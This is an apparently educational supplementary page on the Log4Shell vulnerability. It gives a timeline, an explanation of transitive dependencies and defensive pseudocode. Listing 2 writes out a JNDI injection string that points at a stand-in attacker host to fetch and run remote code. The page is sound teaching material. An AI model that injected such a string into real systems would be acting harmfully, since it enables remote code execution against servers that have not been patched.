---
title: "Supplementary Materials — Log4Shell"
module: SSA
lesson: "case-study"
script: script.md
---

# Supplementary Materials

Read-along reference for the case study. Nothing here is spoken in the audio. The
listings are minimal and illustrative — they show the *shape* of the vulnerability,
not a working exploit.

### Listing 1 — Timeline of Log4Shell
```text
2013         The vulnerable JNDI-lookup behaviour is introduced into Log4j 2 and
             sits unnoticed in production for years. Affected versions: 2.0-beta9
             through 2.14.1.

2021-11-24   Chen Zhaojun of Alibaba Cloud privately reports the flaw to the Apache
             Software Foundation (Log4j's maintainers).

2021-12-09   A proof of concept is posted publicly. The flaw — nicknamed "Log4Shell"
             by the LunaSec team — spreads instantly. Mass scanning/exploitation
             begins within hours.

2021-12-10   Assigned CVE-2021-44228, rated CVSS 10.0 (the maximum). Potentially
             affects hundreds of millions of devices.

Dec 2021     Global emergency: defenders hunt for buried (transitive) Log4j across
             their software over a weekend. Early patches prove incomplete and have
             to be re-fixed. CISA and others issue urgent guidance.
```

### Listing 2 — The log-injection string and why it triggers RCE (illustrative)
```text
# The attacker just gets this string LOGGED — e.g. as a username, a User-Agent
# header, a search term, a chat message. The vulnerable Log4j EXPANDS it instead
# of just recording it.

    ${jndi:ldap://attacker.example.com/payload}

# What the vulnerable library does with it:
#   1. Notices the ${...} placeholder while writing the log line.
#   2. Performs a JNDI lookup to the attacker-controlled address inside it.
#   3. Downloads a malicious Java class from that address...
#   4. ...and EXECUTES it on the victim's server = remote code execution.
#
# Root cause: untrusted INPUT was treated as a trusted INSTRUCTION.
```

### Listing 3 — How a transitive dependency hides the library (illustrative)
```text
# Nobody installs Log4j on purpose; it arrives buried beneath what you DID choose.

your-application
└── some-web-framework          (you chose this)
    └── a-helper-library         (it chose this)
        └── log4j-core 2.14.1    (you never chose this — but you're running it)
                                  ^ the vulnerable transitive dependency
```

### Listing 4 — Treating logged input as inert data, in NESA pseudocode
```text
// The defensive rule: data from the outside world is recorded, never executed.

BEGIN LogUserEvent
    raw_message ← input received from the outside world   // UNTRUSTED

    // Validate / neutralise: strip or escape anything that could be read as an
    // instruction, so the value can ONLY ever be plain text.
    safe_message ← treat raw_message AS literal text only
    IF safe_message CONTAINS lookup/placeholder syntax THEN
        safe_message ← escape that syntax                 // disarm it
    ENDIF

    WRITE safe_message TO log                              // store; never interpret
END LogUserEvent
```
